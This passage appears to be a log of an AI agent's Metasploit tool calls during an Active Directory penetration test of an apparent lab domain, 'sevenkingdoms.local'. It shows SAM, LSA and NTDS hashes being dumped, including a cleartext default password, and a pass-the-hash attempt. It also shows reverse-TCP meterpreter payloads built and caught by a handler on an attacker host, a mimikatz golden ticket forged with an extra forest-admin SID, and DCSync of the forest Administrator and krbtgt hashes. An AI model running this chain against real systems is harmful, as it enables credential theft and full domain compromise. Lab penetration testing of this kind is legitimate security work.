    "type": "auxiliary",
    "name": "auxiliary/scanner/smb/impacket/secretsdump",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/windows/gather/credentials/windows_sam_hivenightmare",
    "rank": "normal"
  }
]
```

### 214. [2025-12-17 12:30:37] `msf_console_execute` ✅

```
[*] Setting default action ALL - view all 5 actions with the show actions command
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 215. [2025-12-17 12:30:46] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 216. [2025-12-17 12:30:52] `msf_console_execute` ✅

```
SMB::Auth => kerberos
```

### 217. [2025-12-17 12:30:57] `msf_console_execute` ✅

```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
```

### 218. [2025-12-17 12:31:03] `msf_console_execute` ✅

```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL
```

### 219. [2025-12-17 12:31:08] `msf_console_execute` ✅

```
SMBUser => eddard.stark
```

### 220. [2025-12-17 12:31:13] `msf_console_execute` ✅

```
SMB::Rhostname => winterfell.north.sevenkingdoms.local
```

### 221. [2025-12-17 12:31:24] `msf_console_execute` ✅

```
[*] Running module against 10.50.0.11
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] 10.50.0.11:445 - Service RemoteRegistry is in stopped state
[*] 10.50.0.11:445 - Starting service...
[*] 10.50.0.11:445 - Retrieving target system bootKey
[+] 10.50.0.11:445 - bootKey: 0xcbef59fc117225a6ada5e68f103b0cd0
[*] 10.50.0.11:445 - Using `INLINE` technique for SAM
[*] 10.50.0.11:445 - Dumping SAM hashes
[*] 10.50.0.11:445 - Password hints:
No users with password hints on this system
[*] 10.50.0.11:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] 10.50.0.11:445 - Using `INLINE` technique for CACHE and LSA
[*] 10.50.0.11:445 - Decrypting LSA Key
[*] 10.50.0.11:445 - Dumping LSA Secrets
$MACHINE.ACC
NORTH\WINTERFELL$:plain_password_hex:a80ed5bfbff2ac3e214ede1e326904d30a949bba6c9332c04ed550736054ce7d19fb23e9a9bbdebbef7faf4c4520e4c6dc85845a6480d7ce9db7bf8e65b527f14777064d3bce00df1948db78158765da0eac60313028b7d40aae24dd32c96b0856911840842922d1ca308a7f30774f9b97ed6faaa4d07a84c3e578cd7f8e53d1f292c8220601041d7312dd75fd51509c00a7bf79f7dd672adf0af2d93bce1ebe9c6873ed1f5ade6bfe3fce77095ef987571d69e1daecb079a02fc09d1010e1926ac5207e558251df4ed30d5ccb93911649b047fe2f3ac9c822d480ca6d0e77cd4d0af6e2c433416f3dfff504aff1cf22
NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:63b06bc824052112adbb298f3bf0151e:::

DefaultPassword
NORTH\robb.stark: sexywolfy

DPAPI_SYSTEM
dpapi_machinekey: 0xa424165f29fa6b82b56846
... [truncated]
```

### 222. [2025-12-17 12:31:57] `msf_console_execute` ✅

```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 223. [2025-12-17 12:32:01] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 224. [2025-12-17 12:32:06] `msf_console_execute` ✅

```
SMBUser => Administrator
```

### 225. [2025-12-17 12:32:14] `msf_console_execute` ✅

```
SMBPass => aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4
```

### 226. [2025-12-17 12:32:19] `msf_console_execute` ✅

```
SMBDomain => .
```

### 227. [2025-12-17 12:32:24] `msf_console_execute` ✅

```
Unsetting SMB::Auth...
[!] Variable "SMB::Auth" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with set --clear SMB::Auth
```

### 228. [2025-12-17 12:32:29] `msf_console_execute` ✅

```
SMB::Auth => ntlm
```

### 229. [2025-12-17 12:32:34] `msf_console_execute` ✅

```
LHOST => 10.50.0.1
```

### 230. [2025-12-17 12:32:38] `msf_console_execute` ✅

```
LPORT => 4455
```

### 231. [2025-12-17 12:32:43] `msf_console_execute` ❌

```
[*] Started reverse TCP handler on 10.50.0.1:4455 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445 as user 'Administrator'...
[*] 10.50.0.11:445 - Selecting PowerShell target
[*] 10.50.0.11:445 - Executing the payload...
[-] 10.50.0.11:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.
```

### 232. [2025-12-17 12:33:09] `msf_console_execute` ✅

```
[*] Setting default action ALL - view all 5 actions with the show actions command
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 233. [2025-12-17 12:33:14] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 234. [2025-12-17 12:33:19] `msf_console_execute` ✅

```
SMB::Auth => kerberos
```

### 235. [2025-12-17 12:33:26] `msf_console_execute` ✅

```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
```

### 236. [2025-12-17 12:33:32] `msf_console_execute` ✅

```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL
```

### 237. [2025-12-17 12:33:36] `msf_console_execute` ✅

```
SMBUser => eddard.stark
```

### 238. [2025-12-17 12:33:41] `msf_console_execute` ✅

```
SMB::Rhostname => winterfell.north.sevenkingdoms.local
```

### 239. [2025-12-17 12:33:45] `msf_console_execute` ✅

```
DomainControllerRhost => 10.50.0.11
```

### 240. [2025-12-17 12:33:56] `msf_console_execute` ✅

```
ACTION => DOMAIN
```

### 241. [2025-12-17 12:34:01] `msf_console_execute` ✅

```
[*] Running module against 10.50.0.11
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] 10.50.0.11:445 - Service RemoteRegistry is already running
[*] 10.50.0.11:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 10.50.0.11:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 10.50.0.11:445 - SID enumeration progress -  0 / 19 ( 0.00%)
[*] 10.50.0.11:445 - SID enumeration progress - 19 / 19 (  100%)
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to ldap/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
# SID's:
Administrator: S-1-5-21-2825620776-1928720347-1758113318-500
Guest: S-1-5-21-2825620776-1928720347-1758113318-501
krbtgt: S-1-5-21-2825620776-1928720347-1758113318-502
vagrant: S-1-5-21-2825620776-1928720347-1758113318-1000
arya.stark: S-1-5-21-2825620776-1928720347-1758113318-1110
eddard.stark: S-1-5-21-2825620776-1928720347-1758113318-1111
catelyn.stark: S-1-5-21-2825620776-1928720347-1758113318-1112
robb.stark: S-1-5-21-2825620776-1928720347-1758113318-1113
sansa.stark: S-1-5-21-2825620776-1928720347-1758113318-1114
brandon.stark: S-1-5-21-2825620776-1928720347-1758113318-1115
rickon.stark: S-1-5-21-2825620776-1928720347-1758113318-1116
hodor: S-1-5-21-2825620776-1928720347-1758113318-1117
jon.snow: S-1-5-21-2825620776-1928720347-1758113318-1118
samwell.tarly: S-1-5-21-2825620776-1928720347-1758113318-1119
jeor.mormont: S-1-5-21-2825620776-1928720347-1758113318-1120
sql_svc: S-1-5-21-2825620776-1928720347-1758113318-1121
WINTERFELL$: S-1-5-21-2825620776-1928720347-1758113318-1001
CASTELBLACK$: S-1-5-21-2825620776-1928720347-1758113318-1105
SEVENKIN
... [truncated]
```


## Phase 8: Session Recovery (Connection Issues)

### 242. [2025-12-17 14:37:23] `msf_sessions_list` ❌

```
Error: MSF Error: true
```

### 243. [2025-12-17 14:37:29] `msf_connect` ❌

```
Error: MSF Error: true
```

### 244. [2025-12-17 14:37:33] `msf_status` ❌

```
Error: MSF Error: true
```

### 245. [2025-12-17 14:37:40] `msf_connect` ❌

```
Error: MSF Error: true
```

### 246. [2025-12-17 14:38:33] `msf_connect` ❌

```
Error: MSF Error: true
```

### 247. [2025-12-17 14:40:47] `msf_status` ❌

```
Error: MSF Error: true
```

### 248. [2025-12-17 14:41:16] `msf_connect` ❌

```
Error: MSF Error: true
```

### 249. [2025-12-17 14:41:23] `msf_console_list` ❌

```
Error: MSF Error: true
```

### 250. [2025-12-17 14:42:29] `msf_connect` ❌

```
Error: MSF Error: true
```

### 251. [2025-12-17 14:42:35] `msf_status` ❌

```
Error: MSF Error: true
```

### 252. [2025-12-17 14:43:36] `msf_connect` ❌

```
Error: MSF Error: true
```

### 253. [2025-12-17 14:43:43] `msf_version` ❌

```
Error: MSF Error: true
```

### 254. [2025-12-17 14:47:17] `msf_sessions_list` ✅

```
No active sessions.
```

### 255. [2025-12-17 14:47:21] `msf_jobs_list` ✅

```
No running jobs.
```

### 256. [2025-12-17 14:47:22] `msf_console_list` ✅

```
{
  "consoles": []
}
```

### 257. [2025-12-17 14:48:58] `msf_console_create` ✅

```
Console created. ID: 0
Prompt:
```

### 258. [2025-12-17 14:49:10] `msf_console_execute` ✅

```
Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v6.4.102-dev-                              ]
+ -- --=[ 2,583 exploits - 1,318 auxiliary - 1,694 payloads     ]
+ -- --=[ 433 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[*] Using configured payload generic/shell_reverse_tcp
```

### 259. [2025-12-17 14:49:15] `msf_console_execute` ✅

```
payload => windows/x64/meterpreter/reverse_tcp
```

### 260. [2025-12-17 14:49:24] `msf_console_execute` ✅

```
LHOST => 10.50.0.1
```

### 261. [2025-12-17 14:49:29] `msf_console_execute` ✅

```
LPORT => 4445
```

### 262. [2025-12-17 14:49:33] `msf_console_execute` ✅

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.50.0.1:4445
```

### 263. [2025-12-17 14:49:44] `msf_sessions_list` ✅

```
No active sessions.
```

### 264. [2025-12-17 14:49:49] `msf_jobs_list` ✅

```
{
  "0": "Exploit: multi/handler"
}
```

### 265. [2025-12-17 14:49:52] `msf_sessions_list` ✅

```
No active sessions.
```

### 266. [2025-12-17 14:49:59] `msf_console_execute` ✅

```
Active sessions
===============

No active sessions.
```

### 267. [2025-12-17 14:50:21] `msf_sessions_list` ✅

```
No active sessions.
```

### 268. [2025-12-17 14:50:26] `msf_console_execute` ✅

```
(no output)
```

### 269. [2025-12-17 14:50:31] `msf_sessions_list` ✅

```
No active sessions.
```

### 270. [2025-12-17 14:50:50] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload.exe (7672 bytes)
```

### 271. [2025-12-17 14:52:10] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload.exe (7672 bytes)
```

### 272. [2025-12-17 14:53:01] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload32.exe (7151 bytes)
```

### 273. [2025-12-17 14:53:15] `msf_console_execute` ✅

```
[*] Stopping the following job(s): 0
[*] Stopping job 0
```

### 274. [2025-12-17 14:53:19] `msf_console_execute` ✅

```
payload => windows/meterpreter/reverse_tcp
```

### 275. [2025-12-17 14:53:23] `msf_console_execute` ✅

```
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.50.0.1:4445
```

### 276. [2025-12-17 14:53:33] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload.ps1 (2192 bytes)
```

### 277. [2025-12-17 14:54:52] `msf_sessions_list` ✅

```
No active sessions.
```

### 278. [2025-12-17 14:54:56] `msf_console_execute` ✅

```
Active sessions
===============

No active sessions.
```

### 279. [2025-12-17 14:55:01] `msf_jobs_list` ✅

```
{
  "1": "Exploit: multi/handler"
}
```

### 280. [2025-12-17 14:59:34] `msf_jobs_list` ✅

```
{
  "1": "Exploit: multi/handler"
}
```

### 281. [2025-12-17 14:59:34] `msf_job_info` ✅

```
{
  "jid": 1,
  "name": "Exploit: multi/handler",
  "start_time": 1765983205,
  "datastore": {
    "payload": "windows/meterpreter/reverse_tcp",
    "LHOST": "10.50.0.1",
    "LPORT": 4445,
    "VERBOSE": false,
    "WfsDelay": 2,
    "EnableContextEncoding": false,
    "DisablePayloadHandler": false,
    "ExitOnSession": true,
    "ListenerTimeout": 0,
    "ReverseAllowProxy": false,
    "ReverseListenerThreaded": false,
    "StagerRetryCount": 10,
    "StagerRetryWait": 5,
    "PingbackRetries": 0,
    "PingbackSleep": 30,
    "PayloadUUIDTracking": false,
    "EnableStageEncoding": false,
    "StageEncoderSaveRegisters": "",
    "StageEncodingFallback": true,
    "PrependMigrate": false,
    "EXITFUNC": "process",
    "AutoLoadStdapi": true,
    "AutoVerifySessionTimeout": 30,
    "InitialAutoRunScript": "",
    "AutoRunScript": "",
    "AutoSystemInfo": true,
    "EnableUnicodeEncoding": false,
    "SessionRetryTotal": 3600,
    "SessionRetryWait": 10,
    "SessionExpirationTimeout": 604800,
    "SessionCommunicationTimeout": 300,
    "MeterpreterDebugBuild": false,
    "AutoLoadExtensions": "priv,stdapi",
    "TARGET": 0,
    "WORKSPACE": null,
    "ContextInformationFile": null,
    "ReverseListenerBindPort": null,
    "ReverseListenerComm": null,
    "ReverseListenerBindAddress": null,
    "PayloadUUIDSeed": null,
    "PayloadUUIDRaw": null,
    "PayloadUUIDName": null,
    "StageEncoder": null,
    "PrependMigrateProc": null,
    "PayloadBindPort": null,
    "HandlerSSLCert": null,
    "MeterpreterDebugLogging": null
  }
}
```

### 282. [2025-12-17 14:59:48] `msf_console_execute` ✅

```
[*] Sending stage (188998 bytes) to 10.50.0.22
[-] Meterpreter session 1 is not valid and will be closed
[*] Sending stage (188998 bytes) to 10.50.0.22
[*] 10.50.0.22 - Meterpreter session 1 closed.
[-] Meterpreter session 2 is not valid and will be closed
[*] 10.50.0.22 - Meterpreter session 2 closed.
[*] Using configured payload python/meterpreter/reverse_tcp
```

### 283. [2025-12-17 15:00:24] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload64.exe (7673 bytes)
```

### 284. [2025-12-17 15:00:34] `msf_console_execute` ✅

```
[*] Using configured payload windows/meterpreter/reverse_tcp
```

### 285. [2025-12-17 15:00:38] `msf_console_execute` ✅

```
Stopping all jobs...
```

### 286. [2025-12-17 15:00:44] `msf_console_execute` ✅

```
payload => windows/x64/meterpreter/reverse_tcp
```

### 287. [2025-12-17 15:00:48] `msf_console_execute` ✅

```
LHOST => 10.50.0.1 && set LPORT 4445 && run -j
```

### 288. [2025-12-17 15:00:53] `msf_console_execute` ✅

```
LHOST => 10.50.0.1
```

### 289. [2025-12-17 15:01:00] `msf_console_execute` ✅

```
LPORT => 4445
```

### 290. [2025-12-17 15:01:05] `msf_console_execute` ✅

```
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.50.0.1:4445
```

### 291. [2025-12-17 15:01:23] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload64.exe (7672 bytes)
```

### 292. [2025-12-17 15:02:15] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/payload64_stageless.exe (235262 bytes)
```

### 293. [2025-12-17 15:03:15] `msf_payload_generate` ✅

```
Payload written to /home/tuomo/msftool/stageless.exe (235261 bytes)
```

### 294. [2025-12-17 15:03:25] `msf_console_execute` ✅

```
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 230982 bytes
Final size of exe file: 238080 bytes
Saved as: /home/tuomo/msftool/stageless.exe
```


## Phase 9: Forest Dominance

### 295. [2025-12-17 15:04:22] `msf_sessions_list` ✅

```
[
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4445 -> 10.50.0.22:53143",
    "via": "exploit/multi/handler",
    "target": ""
  }
]
```

### 296. [2025-12-17 15:04:28] `msf_session_interact` ✅

```
Server username: NORTH\jon.snow
```

### 297. [2025-12-17 15:04:29] `msf_session_interact` ✅

```
Computer        : CASTELBLACK
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : NORTH
Logged On Users : 15
Meterpreter     : x64/windows
```

### 298. [2025-12-17 15:04:39] `msf_session_interact` ✅

```
Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

### 299. [2025-12-17 15:04:39] `msf_session_interact` ✅

```
Process 220 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jon.snow\Desktop>
```

### 300. [2025-12-17 15:04:47] `msf_session_interact` ✅

```
nltest /domain_trusts
List of domain trusts:
    0: SEVENKINGDOMS sevenkingdoms.local (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: NORTH north.sevenkingdoms.local (NT 5) (Forest: 0) (Primary Domain) (Native)
The command completed successfully

C:\Users\jon.snow\Desktop>
```

### 301. [2025-12-17 15:05:28] `msf_console_execute` ✅

```
[*] Sending stage (230982 bytes) to 10.50.0.22
[*] Meterpreter session 3 opened (10.50.0.1:4445 -> 10.50.0.22:53143) at 2025-12-17 15:04:12 +0000
Credentials
===========

id   host        origin      service          public              private                                                                                   realm                      private_type  JtR Format  cracked_password
--   ----        ------      -------          ------              -------                                                                                   -----                      ------------  ----------  ----------------
1    10.50.0.11  10.50.0.22  445/tcp (smb)    Administrator       aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4                                                    NTLM hash     nt,lm
1    10.50.0.22  10.50.0.22  445/tcp (smb)    Administrator       aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4                                                    NTLM hash     nt,lm
2    10.50.0.22  10.50.0.22  445/tcp (smb)    fraktal             aad3b435b51404eeaad3b435b51404ee:087dc4b99073de9d38f7bd99661efb96                                                    NTLM hash     nt,lm
3    10.50.0.22  10.50.0.22  445/tcp (smb)    vagrant             aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b                                                    NTLM hash     nt,lm
4    10.50.0.22  10.50.0.22  445/tcp (smb)    WDAGUtilityAccount  aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7                                                    NTLM hash     nt,lm
5    10.50.0.22  10.50.0.22  445/tcp (smb)    CASTELBLACK$        aad3b435b51404eeaad3b435b51404ee:268d5051c20e6c9522158e632d03a4e7                         NORTH                      NTLM hash     nt,lm
6    10.50.0.22  10.50.0.22  445/tcp (smb)    jon.snow            aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755                         NOR
... [truncated]
```

### 302. [2025-12-17 15:05:52] `msf_session_interact` ✅

```
whoami /user

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
north\jon.snow S-1-5-21-2825620776-1928720347-1758113318-1118

C:\Users\jon.snow\Desktop>
```

### 303. [2025-12-17 15:05:58] `msf_session_interact` ✅

```
nltest /trusted_domains
List of domain trusts:
    0: SEVENKINGDOMS sevenkingdoms.local (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: NORTH north.sevenkingdoms.local (NT 5) (Forest: 0) (Primary Domain) (Native)
The command completed successfully

C:\Users\jon.snow\Desktop>
```

### 304. [2025-12-17 15:06:03] `msf_session_interact` ✅

```
powershell -c "(Get-ADDomain -Server sevenkingdoms.local).DomainSID.Value"
```

### 305. [2025-12-17 15:06:08] `msf_session_interact` ❌

```
Get-ADDomain : The term 'Get-ADDomain' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:2
+ (Get-ADDomain -Server sevenkingdoms.local).DomainSID.Value
+  ~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-ADDomain:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

C:\Users\jon.snow\Desktop>powershell -c "([ADSI]'LDAP://sevenkingdoms.local').objectSid"
```

### 306. [2025-12-17 15:06:13] `msf_session_interact` ✅

```
1
4
0
0
0
0
0
5
21
0
0
0
107
77
23
19
213
192
112
91
130
99
108
108

C:\Users\jon.snow\Desktop>wmic useraccount where "domain='SEVENKINGDOMS' and name='Administrator'" get sid
```

### 307. [2025-12-17 15:06:18] `msf_session_interact` ✅

```
SID                                           
S-1-5-21-320294251-1534116053-1819042690-500  


C:\Users\jon.snow\Desktop>powershell -c "$sid = New-Object System.Security.Principal.NTAccount('SEVENKINGDOMS','Administrator'); $sid.Translate([System.Security.Principal.SecurityIdentifier]).Value"
S-1-5-21-320294251-1534116053-1819042690-500

C:\Users\jon.snow\Desktop>
```

### 308. [2025-12-17 15:06:29] `msf_session_interact` ✅

```
load kiwi
'load' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\jon.snow\Desktop>
```

### 309. [2025-12-17 15:06:34] `msf_session_interact` ✅

```
exit
```

### 310. [2025-12-17 15:06:40] `msf_session_interact` ✅

```
Loading extension kiwi...
```

### 311. [2025-12-17 15:06:51] `msf_session_interact` ✅

```
.#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
[+] Golden Kerberos ticket written to /tmp/forest_ticket.kirbi
```

### 312. [2025-12-17 15:06:58] `msf_session_interact` ✅

```
User      : Administrator
Domain    : north.sevenkingdoms.local (NORTH)
SID       : S-1-5-21-2825620776-1928720347-1758113318
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-320294251-1534116053-1819042690-519 ; 
ServiceKey: e3e8bc543cc3da2285e6a0a4a2934d08 - rc4_hmac_nt      
Lifetime  : 12/17/2025 7:06:59 AM ; 12/15/2035 7:06:59 AM ; 12/15/2035 7:06:59 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ north.sevenkingdoms.local' successfully submitted for current session
```

### 313. [2025-12-17 15:07:08] `msf_session_interact` ✅

```
Process 5408 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jon.snow\Desktop>
```

### 314. [2025-12-17 15:07:14] `msf_session_interact` ✅

```
nltest /dclist:sevenkingdoms.local
Get list of DCs in domain 'sevenkingdoms.local' from '\\kingslanding.sevenkingdoms.local'.
    kingslanding.sevenkingdoms.local [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully

C:\Users\jon.snow\Desktop>
```

### 315. [2025-12-17 15:08:46] `msf_session_interact` ✅

```
dir \\kingslanding.sevenkingdoms.local\c$
 Volume in drive \\kingslanding.sevenkingdoms.local\c$ is Windows 2019
 Volume Serial Number is BA49-CE42

 Directory of \\kingslanding.sevenkingdoms.local\c$

12/12/2025  01:06 AM    <DIR>          inetpub
05/11/2021  08:56 PM    <DIR>          PerfLogs
12/12/2025  01:44 AM    <DIR>          Program Files
05/11/2021  08:40 PM    <DIR>          Program Files (x86)
12/12/2025  01:44 AM    <DIR>          sysmon
12/12/2025  12:11 AM    <DIR>          tmp
12/12/2025  01:06 AM    <DIR>          Users
12/12/2025  01:44 AM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  46,000,107,520 bytes free

C:\Users\jon.snow\Desktop>
```

### 316. [2025-12-17 15:08:59] `msf_session_interact` ✅

```
exit
```

### 317. [2025-12-17 15:09:05] `msf_session_interact` ❌

```
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE
```

### 318. [2025-12-17 15:09:11] `msf_session_interact` ✅

```
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'SEVENKINGDOMS\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 12/12/2025 12:24:21 AM
Object Security ID   : S-1-5-21-320294251-1534116053-1819042690-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: c66d72021a2d4744409969a581a1705e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 465e8e561b0016c64692d1d7b964be32

* Primary:Kerberos-Newer-Keys *
    Default Salt : VAGRANTAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
      aes128_hmac       (4096) : 0c72a36a70f696fbee13a25fd3412d43
      des_cbc_md5       (4096) : 7f2cd0836164e592
    OldCredentials
      aes256_hmac       (4096) : 05ebd58ad12ff00465687ed1e33e4631c4739859f369ae36a7f6fccbe795fb78
      aes128_hmac       (4096) : 778a45f4f133513b831ce562570ac6af
      des_cbc_md5       (4096) : 58bf1ff4c4f4b0f2
    OlderCredentials
      aes256_hmac       (4096) : aa3c962519c1e2dee9ffb53df04325424f812bba47279767ad25eaccffd18695
      aes128_hmac       (4096) : 2f72e6aa959c5ea08e11deabfce6ed55
      des_cbc_md5       (4096) : 62bf012513ea8c0e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : VAGRANTAdministrator
    Credentials
      des_cbc_md5       : 7f2cd0836164e592
    OldCredentials
      des_cbc_md5       : 58bf1ff4c4f4b0f2
```

### 319. [2025-12-17 15:09:19] `msf_session_interact` ❌

```
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE
```

### 320. [2025-12-17 15:09:24] `msf_session_interact` ✅

```
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'SEVENKINGDOMS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 12/12/2025 12:31:46 AM
Object Security ID   : S-1-5-21-320294251-1534116053-1819042690-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 34093422b0136ce5f8a0caea867d4d77
    ntlm- 0: 34093422b0136ce5f8a0caea867d4d77
